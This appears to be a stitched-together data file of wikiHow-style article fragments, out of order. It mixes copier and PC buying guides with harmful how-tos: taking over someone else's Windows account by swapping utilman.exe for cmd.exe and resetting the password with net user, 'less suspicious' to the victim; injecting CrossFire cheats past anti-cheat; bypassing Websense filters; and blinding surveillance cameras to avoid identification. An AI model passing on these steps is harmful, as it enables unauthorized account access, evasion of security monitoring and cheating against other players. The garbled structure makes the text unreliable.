, A #10 straight is 2400 wide by 5600 high. A #14 turn is 4200 by 4200 (discovered by trial and error). Alternatively you can divide the coordinate system by 800 in planning and use 2x7 and 4x4 respectively.

Create a new password.,
Log into the user's account with the new password.",How to Hack Into a Windows User Account Using the Net User Command2," If you don't have access to any administrator accounts on the computer, you can use a Windows installation disc as a workaround. This requires the same version disc for the version of Windows you are trying to access. The disc doesn't have to be the one that came with the computer.If you have an ISO copy of the Windows installation disc, you can burn it to a blank DVD or put it on a bootable USB drive. See Install Windows 7 Using Pen Drive for more detailed instructions on creating a bootable USB drive with Windows installation files.

, You'll be using the installation disc to access the administrator controls to change users' passwords.

, This needs to be done before the Windows logo appears, and the process varies slightly depending on what version of Windows the computer is running:


Windows 7 and earlier - Press the BIOS, SEUP, or BOOT key as the computer is starting up. The key varies by manufacturer, and will be displayed on the boot-up logo screen. Common keys include: F2, F10, F11, and Del. Once you've opened the BIOS or SETUP menu, select the BOOT or BOOT ORDER option.
Windows 8 and later - Open the Start menu or Screen and right-click the Power button. Hold ⇧ Shift and click ""Restart."" Choose the ""Troubleshoot"" option, then ""Advanced options."" Select the ""UEFI Firmware Settings"" option from the menu. Open the BOOT menu.

, The exact process will vary, but generally you'll just reassign the numbers so that the computer boots from the disc or USB drive before the hard drive. Some BIOS software refers to this as the ""Boot Order"" and you will often see a menu option to ""Change Boot Order"". Don't be surprised if you find that that the CD drive is already set as the first drive in the order. If this is the case, you don't need to change anything in the BIOS, SETUP or BOOT sequence.

, Press a key to launch the Windows Setup program and let the files load. This may take a minute or so.

, You can usually just leave these at their default settings.

, This can be found on the same screen as the ""Install now"" button.

, There will usually only be one option on this list.

, This will open the Command Prompt in a new window.

, The following commands will allow you to access the Command Prompt from the Windows Login screen. This will allow you to change the password of any account. Enter the following commands, in order:



cd\ ↵ Enter


cd windows\system32 ↵ Enter


ren utilman.exe utilman.exe.bak ↵ Enter


copy cmd.exe utilman.exe ↵ Enter


, Now that you've made your necessary changes, you can reboot the computer and start changing passwords. Take out the disc or drive before rebooting so that the computer boots normally.

, This would normally launch the Accessibility Manager, but since you made the changes to the system files, Command Prompt will launch instead.


Press Alt+Tab ↹ if nothing appears right away. It may be hidden behind the login screen.

, A list of accounts on the computer will be displayed. Administrators are listed in the left column, regular accounts in the middle, and guest accounts on the right.

, Replace username with the account you want to gain access to.

, Type a new password when prompted and again to confirm. You may want to consider completely erasing the password by simply pressing ↵ Enter on each line, as this may be less suspicious than creating a password the user doesn't recognize later.

, The new password will take effect immediately, so you can switch back to the Windows Login screen and use the password to access the account.

Log in with a dummy account.",How to Hack CrossFire," There are several system items that you must install before you use any Cross Fire hacks. The first of these is the DirectX 11 Technology Update from Microsoft. You can download it here. Run the installer after downloading it.;
, This tool from Microsoft is required to run the hack injectors. You can get the 32-bit version here or the 64-bit version here.


If you aren't sure if your computer is 32-bit or 64-bit, see How to Check if Windows is 32-Bits or 64-Bits.

, This is what most hacks are written with. You can download the installer here.

, There are two DLL files that you will need to download and place in your CrossFire folder. You can download msvcr100.dll from here and msvcr100d.dll from here. Make sure to select ""Download ZIP-File"" to just download the DLL in an archive file instead of downloading the installer.

, Extract the DLL files from the ZIP files that they downloaded in by right-clicking the files and selecting ""Extract"". Open the ""CrossFire"" folder from your Program Files in another window and drag each of the DLLs into the folder.


Some users have reported that adding the two DLL files to your C:\Windows\System32 (32-bit) or C:\Windows\SysWOW64 (64-bit) folder as well will help prevent errors., There are several communities dedicated to hacking CrossFire. Because hacks are quickly detected and blocked, you'll need to find a place where all of the latest hacks are listed. One of the most popular communities is mpgh.net. The ""CrossFire Hacks & Cheats"" section will have all of the latest hacks that still work.


You will likely need to create an account in order to access the download links for the hacks.

, If the forum you are using is well-maintained, all of the hacks that have been detected and blocked will be crossed out or otherwise indicated. New hacks that still work will typically be at the top of the list of threads. Browse through a few hacks that haven't been detected yet and find one that suits your needs.

, Many hacks follow the same basic installation procedure, which will be outlined here, but many hacks have specific steps that you will need to take in order for them to work.


Pay attention to the region that the hack was made for. Hacks for North America usually won't work for the Philippines, for example.

, Most hacks will come in ZIP or RAR format. If you don't have a program that can open RAR files, download and install 7-Zip (7-zip.org), a free archive extractor that can open RAR files. To extract the files, right-click the downloaded file and select ""Extract"".

, You will need a program called an ""injector"" to run the hack files. You can find injectors on the same forums that you find hacks. Look for the ""Injectors"" or ""Tools"" section of the hack forum to find the latest injector releases.

, Running as an administrator will allow the injector to modify the necessary DLL files.

, There is typically a Settings button you can click to open this menu.

, This will result in the best chances of your hack loading properly.

, This will help ensure that your injector does not get detected by the anti-cheat mechanisms. The button will turn blue to indicate that it has been activated. Close the Settings menu., This will ensure that the injector hooks into the CrossFire process.

, Most hacks come in DLL format. Browse for the DLL that you extracted from the hack archive that you downloaded in the previous section.

, Once you've selected your hack DLL in the injector, you can start CrossFire. The injector will automatically apply the hack and close itself as the program starts.

, Always test hacks with a dummy account. Hacks get detected quickly, so it's always a good idea to test your hack by logging in with a dummy account first. This will help keep your main account from being banned by using a detected hack.

Purchase a desktop model for home offices.,
Know the basics.,
Consider a multifunction device.,

Finish your research.,
Rent a copier for short-term use.,

Consider buying a used copier.,
Read lease agreements carefully.,
Get a separate servicing agreement.",How to Buy a Copier," If you are buying a copier for home use, or for a business that makes fewer than 700 copies per month, purchase a desktop model. These are much cheaper and simpler than a large, standing device. The rest of the information in this article focuses on the needs of larger offices.


A laser copier/printer/scanner typically costs between $150 USD (black and white only) and $500 USD (fast, quality color).Inkjet copiers can cost as little as $60, even for color copiers. However, they can cost two or three times as much to operate as laser copiers. Expect to pay 20 cents per black and white page.;
, While there are still a few copier types on the market, most businesses won't have trouble choosing which option they need:



Laser copiers are faster and cheaper to operate in the long run. Inkjet copiers are not recommended for businesses.Digital copiers are by far more convenient and common than old, analog copiers.

Color copiers are significantly more expensive and malfunction more often than black and white copiers. If you only need the occasional color document, consider a cheaper hybrid copier.

, Almost every modern copier is also a printer, and some can scan or fax documents as well. Weigh the pros and cons of a single ""multifunction device"" versus a simple copier and additional machines:


A single device is typically cheaper than separate machines, assuming you need every function.
Using several machines reduces the impact of a malfunction.
Large offices should use multiple machines, to avoid waiting times for a single machine.

, Matching the copier to your needs will save money, avoid delays, and even reduce the frequency of malfunctions. Complete this vital step as follows:


Refer to your copying records, preferably for the last 6–12 months. If you don't have any, ask the current copier servicer for copies of past invoices. These should include the number of copies made.

Find the average number of copies made per month.
Multiply this by 1.2 to be safe, or by up to 1.5 if your estimate is uncertain. This provides a buffer against surges in use, and against misleading advertisements. Look for a copier with a monthly volume slightly higher than the figure you calculated.

, Examine the speed of printing — but don't assume that faster is better. Copiers that sit for a long time between jobs tend to have more malfunctions. Strike a balance between waiting times and copier health with these rough industry guidelines:11–20 pages per minute (""Segment 1""): Recommended for home offices or very small offices.
21–30 ppm (S2): Most small offices with 6,000 copies a month or less. Keep in mind this ""slow"" speed is still one page every two or three seconds.
31–44 ppm (S3): Small to mid-sized offices (up to 12,000 copies a month). Use this segment or higher if you need to hook the copier up to the office network.
45–69 ppm (S4): Mid-sized to large offices. Usually only necessary for law firms, accountancy firms, and other offices with high copying peaks and constant, heavy use.
70–90 ppm (S5): Offices with extreme copy requirements, or who need a temporary rental for a print run.

, Most office copiers automatically sort multi-page documents. Additional features may come with the copier or in an add-on ""finisher"" unit. Investigate the following:


Number of bins (how many different documents can it sort at once)
Capacity of each bin (how many finished pages can it store)
Can it automatically staple or hole-punch documents? This may be vital for offices with high print runs of multi-page documents.

, Before you make your final decision, check up on the following:


Does the copier support duplexing (the ability to print on both sides of a page)?
How much can the copier reduce or enlarge a document?
If you use non-standard paper sizes, does the copier support them?
Most high-quality color copiers come with a built-in Raster Image Processor (RIP).If yours doesn't, you may need to purchase an external RIP.
What's the first copy time (the amount of time to print the first copy)? If your office commonly makes just a single copy, this is an important statistic.

, Rental agreements are straightforward: you pay a certain amount each month, then return the copier when finished. This is the worst value for your money, so it's typically reserved for companies with a sudden surge in copy requirements.


Avoid complex rental agreements with additional charges. You should be able to find a service with a flat fee and no complications.

, This requires the most money at time-of-purchase. You should be confident that you'll use this copier for more than a couple years. If you have the funds, there are two main advantages to this tactic:


You might be able to write off the expense in one tax year, which could give you a short-term financial advantage.Consult a local tax lawyer.
You won't be stuck under a lease agreement, which may save you a little money if you do end up changing copiers later.

, A used copier usually goes for about 1/5th the price of a new one. If you're starting a new business and don't know what your copy volume will be, this is the lowest risk investment. Ask for the copier's ""copy count,"" or number-of-copies printed. A high-quality printer with speeds of 45+ pages per minute may be good for 15 or 20 million copies. A slower, older, or lower quality printer may decline after 1–5 million.

, Leasing is a common middle ground between buying and renting. You pay a monthly fee to use the copier for one to five years. At the end of this time, you have the option to purchase it permanently. Leases are very difficult to escape once signed, so read them thoroughly.Fair Market Value (FMV) leases usually cost $100 USD to $650 USD each month, depending on copier quality. Once it's over, the bank sets a price for the copier based on current market value.
$1 Out leases let you buy the copier for US $1 at the end of the lease. This is essentially a purchase in installments, with higher monthly fees.
If you're a new business, the owner may need to sign a personal guarantee. This means the owner will have to pay the lease fees out of pocket if the business cannot.

, To save money, stay away from packaged lease + service deals. Instead, hire a different company to keep your copier stocked and repaired. Review the service agreement for the following information:


Find the cost of service per copy. Multiply this by your monthly copy volume to find the monthly fee.
Look for a minimum monthly fee. During slow months, you may end up paying this fee instead of the service per copy. Estimate the additional cost based on the last twelve months of copy volume.
Ideally, look for a four hour maximum response time for emergency repairs.
If your office operates outside of normal business hours, make sure emergency repairs are covered during those times.

Decide what type of operating system you want.,
Determine your computer usage.,
Think about memory usage.,
What kind of graphics card will you need?,
What is your price range?,
Seek help, if needed.",How to Select a Desktop Computer," What operating system are you looking for? The two most common commercially available operating systems are Windows and Macintosh (Mac).;
, What are you going to be using the computer for? If you don't intend to use your computer very often, you don't need a powerful system. If you intend to play games, 3D model, or create / edit pictures regularly, you may want a more powerful machine.

, How much memory will you need? For lighter use, 2GB of RAM is probably enough memory. For gaming and other memory-intensive tasks, look for something with more memory.

, For lighter use, a high-end graphics card probably isn't really essential.

, If you're on a tight budget, try not to aim for a high-end computer. They are usually expensive.

, If all else fails, seek out a tech support employee at a local electronics store and ask for advice. Not only are they usually knowledgeable about desktop computers, you will be physically near the computers and able to inspect them.

"
Research the product itself.,
Become familiar with the lingo.,
Ask about who fixed or refurbished the product.,
Make sure the product comes with a decent warranty.,
Ask about return and exchange policy.,
If possible, test the product before buying it.,
Hold on to any receipts or paperwork you received.",How to Buy Used Electronics," Some products last a long time and have lots of life left, some do not last as long, for instance they might have an expensive rechargeable battery that cannot easily be replaced if it has worn out. Products with mechanical parts are also more prone to wearing out. If the product has software check that this is still supported by the manufacturer. This may or may not matter depending on the device. For instance a device like a smartphone that depends on apps will be more likely to become obsolete sooner than a washing machine where the software never needs changing.


In addition, there are versions of particular products that may have a known fault with them.
Read online reviews. You can ask the owner questions to see if the product has these problems. For example, some devices may have several complaints about the handle coming off, or maybe the unit overheats when it sits idle for a few minutes. Look closely at the used device in person, if possible, to see if these defects are present. Usually, preliminary research will tell you what to look for.
When reviewing, ask, ""What does the device come with if I buy it new?"" This way, you will know if there is anything missing, and the price should be adjusted to reflect any missing components or documentation.;
, A refurbished product hasn't necessarily been used; it may have been sent back to the manufacturer for a cosmetic reason, fixed accordingly, and sold as refurbished (often with a manufacturer's warranty). A reconditioned item, on the other hand, has been used and fixed up; they usually come with a warranty from the company who's selling it, but not from the manufacturer.

, If the manufacturer did it, then there is less risk involved than if it was done by a third party. You might also be able to find out what about the product was fixed or changed.

, If you are buying from a retail chain or other reputable sellers, chances are that some sort of warranty is available. Find out how long this lasts and what it covers. Can you buy additional coverage? If so, for how long and how much does it cost? Even if you choose not to buy the extended warranty, the fact that it is offered might suggest the company or manufacturer's confidence in the product. A shorter warranty (about 6-months and under) could show a lack of confidence in the product.

, Most reputable places will not even ask questions if you return a product within a month or so.

, If you are buying from someone besides a retail chain, this is especially important. While this will not guarantee that it will not break later, it at least makes sure that you have a current working product.

, You will need a valid warrant to receive a repair or replacement. This is especially important if you are paying with cash. Receipts can prove that you purchased it and when. Keep your receipt in a safe place. You never know when it can come in handy.

, Don't delete or create accounts but you can test stuff out like your favourite music. You never know when a computer on display is not good enough to do what you need it to, so this step is vital.

, Run multiple programs at the same time and see if it bogs/slows down the machine. Try restarting it if you have permission and doing simple daily or weekly tasks such as checking for viruses, changing the wallpaper or modifying the display picture.

,, Have fun!

Get graphics cards: If you want to sell this to a video game enthusiast, the computer must have decent graphics capabilities.,
Get extra hard drive space: More space means you can store more stuff on the computer.,
Get more memory or fast processor unit: People who like speed on their computer will want these features.,
Get an extra DVD Writer: An extra DVD writer drive, perhaps one that features the ability to burn information (which could be anything from MP3 sound files to full backups of your files, given enough DVDs), would be a welcome addition to the system.

,
Get current accessories: Be sure that the computer's keyboard, mouse, monitor, speaker system and other accessories are as up-to-date as possible to appeal to buyers who want the latest gadgets.

",How to Invest in a Computer," High-end games require high-end graphics.;
, That's always an attractive feature, especially to those who use a computer for everything from school assignments to MP3 storage.

, Buying extra RAM (Random Access Memory) is the most cost-effective way of improving your computer.

Motherboard:


This is arguably the most important component in the computer.,
Processor:


The processor is to the computer as the frontal-lobe is to your brain.,
Video card (AKA Graphics card or GPU):


This is either a critical component, or a negligible one depending on what the computer will do.,
Hard drive (AKA HDD):


Two primary aspects of the hard drive to consider are capacity and performance.,
Memory (AKA RAM):


This component allows your computer to cache files in temporary, fast memory, which allows you computer to do many smaller things faster than it normally would.,
DDR3 is the most common now and is available cheaply from many reliable sources.,
Sound card (not included in total price):


Sound cards are usually only added to motherboards without on-board sound, those who require nothing but the best quality sound, or those who do audio editing.,
Case, monitor, optical drive(s), mouse, and keyboard:


Case: the case should be large enough to house all your components, and larger if you want the installation to be easy.,
Operating System (AKA OS): For home users, Windows 7 Home Edition will be perfectly fine.",How to Purchase Parts for a Custom Computer (on a Budget)," If this is not a quality piece of hardware, your whole computer could be doomed from the get-go.
Try buying from established and reliable companies such as ASUS, GIGABYTE, ASRock, or Intel.
Purchasing the motherboard is a complex decision. It often determines how much money you will need to spend on other components, but you also want to keep options open for upgrading. Some examples (for modern components as of Q2 2013) would be purchasing from Intel using a Z77 chipset for best overclocking ability rather than a H77 or B75 (inexpensive chipsets); another example would be getting a motherboard with SLI capabilities (with 2 or more 16x PCIe slots) or single 16x PCIe (cheaper motherboard).
Additional options should be considered for the motherboard. If you are not using the computer for video card-intensive programs (such as gaming, certain 3D workstation applications, or some components of advanced video editing) then on-board video will save you money. Additionally, on-board sound is much higher quality than it was a couple years ago, and this too will save you money (if exceedingly high-quality sound it not required). On-board ethernet should be a must for any modern computer.
Count on spending 10-15% (of your total costs) on a motherboard without spending less than $90.;
, It does most of the logic and math used by all executables, and it organizes all the information going to, from, and through the computer.
There are many factors that make a good processor. Now, more than ever, gigahertz (GHz) are not the key aspect (but it does help). Key factors of a processor are: the manufacturer (AMD or Intel), the number of cores (multi-core processors are very common now), speed (GHz), cache (L1, L2, and sometimes L3: the more the merrier), and ultimately the processor has to be compatible with the motherboard you chose (socket type). A dual core should do for basic applications. A fast dual-core like the Intel i3-3220 works well for gaming. A quad core is more useful in multitasking and things like video editing, but be aware that not all programs can fully utilize 4 cores.
As of today's date, Intel's Core i7 is the fastest single-socket processor, but it is expensive. An Intel Core i5 or an AMD FX would serve well for most applications.
It may be smart not to buy the absolute top-of-the-line processor, since upgrades are always frequent (if you purchased the right motherboard compatible too).
Based on your needs, plan on spending between 10% and 25% of the computer's total cost on the processor. Add another 2-7% if the processor does not come with a cooling solution (you will need to purchase one separately). Don't forget to get a tube of thermal paste if your cooler doesn't come with it!

,

If you chose to buy a motherboard and purposely got on-board video, this section can be ignored (if you have a motherboard with on-board video, but wish not to use it continue reading--but be sure to disable on-board video in the BIOS when you first build the computer).


Be sure to get a video card with PCIe 16x or better (depending on the motherboard slots you have available).
When not using the computer for gaming, a simple video card will likely be sufficient. Something that is designed by ATI or Nvidia (Nvidia does not actually produce their own video cards, but a card with an nVidia GPU should suffice) is best. An Nvidia Geforce 650 or an ATI Radeon 7770 should serve quite well. Be sure it is at least DirectX 10 compatible.

Spend at least 10-15% on a non-gaming rig's video card.


Gaming computers require much more from a video card. Video cards are the primary bottleneck in modern gaming. Running 3D games in high resolution with all the bells and whistles would require a $300+ video card. As for the hardcore gamers, putting 2-3 cards in SLI/Crossfire configuration is often required to reach performance targets when single cards are not enough, but make sure you have a compatible motherboard and a large power supply.
While on a budget, it will be better to purchase one video card, but having a motherboard capable of accepting two gives you room in the future to upgrade. In a year or two, you can add another identical video card and (by then) cheaply increase your video performance (by an average of about 40-50%). Beware though many budget cards lack the ability to SLI/Crossfire(using 2 or more cards)

Gaming video cards are extremely important, and likewise, expensive. 25% (of the total cost) would be the minimum for a gamer, and 35-45% of the rig's cost wouldn't be out of the question.



,

Capacity will allow for more/larger files to be stored on the computer. The more GBs, the better. The highest capacity hard drives are perpendicular-recording drives.
A by-product of capacity is performance due to areal density, which allows the disk to read/write more information while spinning at the same speed. There are other attributes which contribute to performance which is RPMs (don't settle for less than 7200 RPMs), and cache (16MB is good, but there are still some very high performance HDDs with only 8MB).


Capacity should almost always take priority over performance, since in most cases (especially in gaming or other 3D applications) the HDD is not a performance factor except for when loading files for caching.
SATA is the current standard, so be sure to get a SATA hard drive (while older HDDs use PATA connectors, SATA will perform much better, and will be compatible with future motherboards.
SSD's are useful for low disk latency. It will help your computer to boot up and open programs very quickly because of how fast you can read data. Usually SSDs are above $0.50 per GB as of Q2 2013. Many people buy a 128GB SSD to use as a boot drive (install windows on it) and then use an extra HDD to store data like movies or pictures.

, Thus, to a point, the more RAM you have the faster things will respond.
RAM is important for modern games, at least 4GB - 8GB is recommended; but for a less demanding users 4GB is plenty.
Make sure that you get a 64 bit operating system if you get over 3GB of RAM, but make sure you have a 64 bit processor.
Be sure to purchase RAM which is compatible with your motherboard (SDRAM, DDR, DDR2, DDR3).

,


Spend 10-15% for standard users, and about 20% for gamers.

,
If you are adding a sound card because the motherboard doesn't have on-board sound, any sound card will do, but cards from Creative are highly recommended. Audigy, Audigy 2, or X-Fi come in many different specs and prices, and are among the best.
For the best quality sound, or for gamers, there is only one option: Creative's X-Fi. If you want to go all-out, X-Fi Fatal1ty will even give slightly better performance in games.

, If you bought an ATX motherboard, almost any standard case should work (if you didn't, make sure the case supports the motherboard mounts).
A case and power supply combo will save you money, but the power supply may not be able to support certain things like SLI and video card power assist. In these cases, a separate power supply will need to be purchased.
Monitor (this was not included in the total price): LCDs are cheap, and are always getting better. For a standard user a $200 19-inch or $170 17-inch is perfect. For gamers CRTs (older, big, heavy monitors) still offer the best flexibility and image response, but LCDs are very convenient, and a well-priced LCD can give performance comparable to CRTs.
Optical drives: as long as you do not purchase next-generation hardware like Blu-ray or HD-DVD (HD-DVD should be avoided as it does not have a lot of support), these drives can be very cheap. A very fast DVD+/-RW can easily be purchased for less than $40. Going with a respectable and reliable company is key, but speed is also an issue. One DVD+/-RW should take care of all your current-gen optical drive needs.
Keyboard and mouse (not included in total price): wireless mouse and keyboards are the staple for modern computer users. You can get a key/mouse combo for less than $100. A wired mouse and keyboard could be bought for $30 or less.

, For gamers and demanding applications (like Photoshop)Windows 7 Professional or Ultimate is a good way to go. Windows XP support will be dropped soon, and Vista is buggy, so Windows 7 is the way to go if you want Windows

For more speed and general use (not gaming) Linux may be better. Linux is free and outperforms Windows 7 in many benchmarks. Although it does have an abbreviated list of supported hardware, it will run fine on AMD and Intel PCs, and also will run quickly with 512MB of RAM and a 1 GHz Processor

Take things into consideration.,
Do you want access to lots of effects that you can apply to instruments and voices(e.g.,
Perhaps you will want to add some third party effects, plugins, or mixing tools; this will require VST support.

,
Consider Price.,
Once you have decided on your recording software, it's time to consider which operating system you would like to work on.,
Make sure you have a fast multi-cored CPU.,
Have as much RAM as you can afford.,
Have multiple fast hard drive with lots of space.",How to Pick a Computer for Your Recording Studio," Preliminary considerations are as follows. Do you plan to record, say, a big band or a small acoustic act? This will determine how many tracks you need the program to be capable of processing. Some programs, such as the latest version of Steinberg's Cubase support unlimited tracks.;
, reverb, echo, distortion)? Keep in mind that the more expensive software packages may come with better quality effects.

,, How much are you willing to spend? If you are just starting out and are unsure about whether you will lose interest in recording, then perhaps it would be a good idea to invest in a basic version of (Cubase, for example) a recording software package. Or, better yet, you could try free software such as Audacity, Reaper, or Kristal. Free software is a wonderful way to get to grips with the basics of producing music.

, The software you choose may dictate the operating system you must have. Or maybe even your preference or familiarity with one will be the deciding factor.


In the recording industry, Macs are usually considered the standard on account of their reliability and stability. Unfortunately, you have to spend more to get a Mac of the same specification as a PC. If you're on a budget, a PC is most likely the wisest choice.

, For most home recordists, the majority of the processing goes on inside the computer. You can never have a processor that's too fast; adding more processes requires more power to ensure that everything runs smoothly.

, The more RAM you have, the more your computer will be able to handle in the way of plugins, effects and so forth. It will also help your system run faster for reasons that I will not get into (see the computer information page if you would like to get into the details). Remember, 32bit operating systems cannot utilize more than 4gb of ram. This is a strong reason to go with a 64bit OS.

, This is another important consideration. Recording music requires takes up a lot of space; one song can occupy a few gigabytes of hard drive space. Therefore, get the biggest hard drive you can afford, or keep in mind that you can always add an external hard drive or two later on. Also, a fast hard drive will reduce the chances of unwanted pops and clicks during recording and playback and somewhat speed up your computer's processes; at least a 7200 rpm hard drive with a 32mb cache is recommended. SSD hard drives are currently the ideal but can be very pricey.

Find a proxy or circumvention site.,
Type the url you want to go to in the box on the site.,
Google the URL you would like to get on.,
Looks for the 2 links next to the search results: ""cached"", and ""similar"".

,
Click ""cached"".",How to Bypass Websense," A range of proxy sites offer a way to bypass Websense by, for example, using a secure connection (note that the url begins with ""https,"" not ""http""). You can access the circumventor or proxy site, and then access blocked sites through that. Alternatively you can use a program called vpntunnel to run programs (like bittorrent or games like World of Warcraft etc).

, Once you access the proxy site, enter the address of the site you want to go to in the box on the screen. If you're using vpntunnel, install and log in with the software.


Install a circumventor program on your home computer. At Peacefire.org you can download a circumventor program on your home computer so that you can access blocked sites at other locations by connecting to your home computer. Download a couple programs, and run the setup, and the program will give you a url you can use to access it from anywhere. Write down this url and carry it with you. Note: you don't download the programs onto the computer with the filter--you download them onto another computer that you can connect to from the filtered computer.
Enter the url for your home computer in the web browser on the filtered computer. When you're at a computer with a filtered connection (at work or at the library, for instance), simply enter the URL the circumventor program gave you, and you will be able to access blocked sites via your home computer. Note that this will only work if your home computer is on and connected to the internet.
Use command prompt to find the websites IP. This is quite a good method, using the PING function on Windows PCs, you can find the websites IP Address, and use direct access. If the website is on a Shared Server however, it is USUALLY like this: http://123.123.123.123/~WEBSITENAME

Shine a powerful LED (light-emitting diode) directly into the camera lens.,
Block your face with the light.,
Hold steady.,
Attach infrared LEDs to your clothing.",How to Blind a Surveillance Camera1," The brighter the flashlight, the better. Use a small device that you can easily store. This method only works well in the dark, so save it for stealthy excursions at night or in enclosed spaces., Figure out exactly where the camera is, and shine the light directly into the lens. When properly executed, this technique should create a lens flare that makes it nearly impossible to tell what you look like.Be warned that the flashlight method is not subtle. The sudden flash of will alert any vigilant guard to your presence. However, you should at least be able to use the bright light to obscure your face.

, Be careful not to drop the light beam from the camera lens, lest you reveal your face. Make sure not to shine the light onto your face. Remember: this method only works if you are quick and precise.

, For a quick fix, superglue a string of bright lights to a hat or headband.If you wish to get more involved, you can craft an LED ""mask"" that even more heavily obscures your face. Make sure that the lights are bright enough to blot out your face from the camera's view, but not so bright that they blind you!

"
"
Point an infrared laser directly into the lens of the camera.,
Be aware of the shortcomings.,
Look out for other cameras.",How to Blind a Surveillance Camera2," This method is more subtle than shining a bright light around, but it also requires that you are much more precise. If the laser-point slips away from the lens for even an instant, the camera will catch your face. Act quickly and efficiently to avoid detection.This method should work day or night. It may be somewhat more effective in the dark.You can use any standard laser pointer here. In general, the stronger the laser, the more powerful the blinding effect.

, The camera can see you until you get the laser aimed correctly. Anything that comes between the laser and the camera will instantly un-blind the camera. Also, the effectiveness of this method is a bit hard to gauge. From your end of the camera, you cannot tell if the laser is aimed correctly.


Do not point the laser into your eye. You might blind yourself!Consider wearing dark glasses to protect your vision, but do not expect them to keep you completely safe.

, The focus required of this method means that you can only blind one camera with one laser. The laser is more subtle than LEDs or a flashlight, but the effect is limited. If you need to blind multiple cameras at once, then you'll need as many lasers as there are cameras. Consider coordinating with friends.

"
"
Smear jelly onto the lens.,
Obscure the lens with tape.,
Cover up the entire camera.",How to Blind a Surveillance Camera3," Rub Vaseline, petroleum jelly, or another viscous substance onto the lens of the camera to make the picture come out blurry. In a pinch, try using sticky-but-spreadable foodstuffs like butter, jam, and peanut butter. Be careful to coat the entire surface of the lens. Make sure that you aren't caught on camera as you approach the recording device!


Be careful not to leave fingerprints on the camera! You may avoid visual detection, but people might still be able to identify you based on the other evidence that you leave behind.

, Use duct tape, masking tape, or anything opaque. Be sure to cover up the entire recording area! Hide your face to avoid identification as you approach the camera.

, If you're able to manage it, you can simply block the view of the recording device with a larger object. Try taping or tying a bag or a piece of fabric over the lens. Obstruct the camera's line of sight by putting a screen, a board, or a piece of furniture in the way.


You can cover up the camera with a shirt or a scarf, in a pinch. If you leave your clothing on the device, make sure that it cannot be traced back to you.

Practice ""white hat"" or ""ethical"" hacking.",How to Become a Teen Hacker," Many high schools offer computer science programs that can teach you the basics of programming and networking. Taking these classes while they're free to you can help a lot in the future, and give you a leg up in your personal studies. Talk to your counselor to see if there's a computer science path you can take for your electives.;
, Focus on operating systems and networking. You may be able to find many more programs than you would at your high school, but these will likely cost some money to take. These courses may offer you access to more highly-trained professionals than you would find at school.

, This is a great way to meet like-minded people as well as potentially get more one-on-one time with the computer science teacher. If you don't have a computer science club, consider forming one yourself. These things look good on college resumes as well, where you can learn a lot more about applied computer science.

, Hacking is more than just knowing programming languages. You have to be able to approach problems from unique angles and exploit vulnerabilities that the creator would never think of. Knowing how to apply creativity to attack problems can give you a big advantage., Use your school's computer labs to learn the layout and flow of as many operating systems as possible. To be a successful hacker, you'll need to be comfortable working in Windows, Linux, and OS X. You should be able to perform any major function and find any location without having to think about it.

, A lot of time hacking is spent looking at a command line and typing commands. Get acquainted with the Windows Command Prompt and the Terminal for Linux and OS X.


See How to Use CMD for more information on the Windows Command Prompt.
See How to Get Familiar with Ubuntu Commands for details on the Ubuntu (Linux) terminal.

, A lot of advanced hacking will occur at the hardware level as you interact with network cards, routers, and memory. Knowing the basics of how a computer works and how components connect to each other will help as you learn to take advantage of systems. See How to Build a Computer to get an understanding of how it all works together. You can gain a lot of basic computer knowledge from taking computer classes at school.

, Knowing how data is transferred over the internet is essential to be a successful hacker. Learn how the different layers of network models operate. This will teach you where data can be found and how to intercept and change it. See How to Understand Computer Networking for a rundown on network models and layers. Basic networking knowledge is critical for effective, high-level hacking.


You may be able to take classes on networking at your school or local community college.

, Don't just learn from your classes. You should be actively engaging in learning as much as possible. Pick up some old used books on hacking, or sign up for a quarterly publication. Any and all information that you can consume will help increase your hacking knowledge.

, HTML is the basic language that all web pages are made with. Knowing HTML basics can help you identify weaknesses in websites, as well as code your own basic sites. See How to Learn HTML to get started.

, JavaScript is one of the main ways that content is displayed on websites. Learning how JavaScript works can help you identify exploitable parts of websites and inject your own scripts. See How to Use JavaScript Injections for a look at how injections work.

, SQL is the main database language for websites and online services. Hackers spend a lot of time attempting to access databases, so knowing how SQL works is essential for most hacking. See How to Create a SQL Server Database for information on setting up an SQL server to test.

, PHP is a server-sode language, and is often used to handle secure logins. This makes knowing PHP essential for hacking secure sites. See How to Learn PHP and MySQL for details on getting started with PHP. This is one of the most essential languages for hackers., Python is a high-level language that allows you to quickly write programs and scripts. It is essential for writing your own exploits and hacks. See How to Start Programming in Python for tips on getting started.

, The safest way to practice hacking is to hack your own equipment. Setting up a private network with virtual machines will allow you to test and deploy hacks without causing any actual damage or landing yourself in trouble with the law.


You can use virtual machines to install any operating system on your computer. This will allow you to test hacks tailored to specific operating systems. See How to Install VirtualBox for information on getting started with virtual machines for free.

, If you want to try your hacking skills in the real world, there are several sites available with built-in vulnerabilities that are perfectly legal to hack. These sites will let you practice your scripts and attack methods without any fear of legal repercussion. Popular practice sites include:Bricks
bWAPP
DVWA
Google Gruyere
McAfee HackMe sites

, There are a variety of hacking communities out there, from easy-to-find forums to incredibly hidden enclaves. Find a group of hackers who can challenge you to become a better hacker and help you when you are stumped. Hacking communities may also provide resources for practicing hacking techniques safely.

, Regardless of how tempting it may be, don't start doing illegal things with your new hacking knowledge. A single bad hack can land you in trouble with the law, potentially halting your hacking career before it even starts. Don't be fooled by the stories of professional hackers becoming trusted employees after being caught; far more often hackers simply go to jail.


Avoid being associated with illegal behavior as well. if your hacking community starts performing attacks, you can be considered guilty by association. If you become uncomfortable with the actions of others, distance yourself as much as possible.

, These terms are used to describe hackers who look for vulnerabilities in systems but do not exploit them for their own gain. Instead, white hat hackers will report these vulnerabilities to prevent future attacks from malicious hackers. Skilled white hat hackers can earn lots of money in the security industry.

After having done so, you will then need to log in with your username and password. Go to the HTS home page, and the login form will be in the top left side of the page.;
, Here, under the “Challenges” subheading, you will find the “Basic missions” link. Click this to continue.

, Once this page finishes loading, you should see a whole series of 11 different challenges. The top should be “Basic 1”; go ahead and click it to continue.

, The first challenge is called “The Idiot Test,” but don't take it personally. You should take a few minutes to at least try and figure this one out before continuing on to the next step or even reading on.


The most important clues should be given in the little help box below the password field. Basically, you should know that every website is made up of a coding language called HTML. Understanding that this language makes up every website should be your greatest clue. The next step will contain the answer to the challenge, so please make sure to exhaust your brain before continuing.
If you don’t wind up figuring it out on your own, nothing really happens. You are free to access further missions. In addition, you are free to enter as many wrong answers as you want, nothing will change. However, learning by doing each step will increase your chances of understanding future missions.

